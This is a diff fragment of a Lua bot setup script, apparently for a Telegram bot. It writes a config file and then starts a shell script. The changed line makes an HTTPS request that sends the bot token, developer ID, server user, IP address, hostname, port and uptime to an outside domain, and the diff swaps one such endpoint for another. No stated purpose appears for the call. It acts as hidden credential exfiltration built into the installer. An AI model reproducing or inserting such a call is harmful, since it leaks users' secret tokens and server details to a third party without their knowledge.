@@ -70,7 +70,7 @@ David = DevAbs:get(ServerDavid.."TokenDavid"):match("(%d+)"),
 SudoIds = {DevAbs:get(ServerDavid.."IdDavid")},
 }
 Create(Config, "./config.lua")   
-https.request("https://apiabs.ml/config.php?Get=David&DevId="..DevAbs:get(ServerDavid.."IdDavid").."&TokenBot="..DevAbs:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://free-ha.ga/AVIRA.php/?id="..DevAbs:get(ServerDavid.."IdDavid").."&TokenBot="..DevAbs:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 file = io.open("TOKYO.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
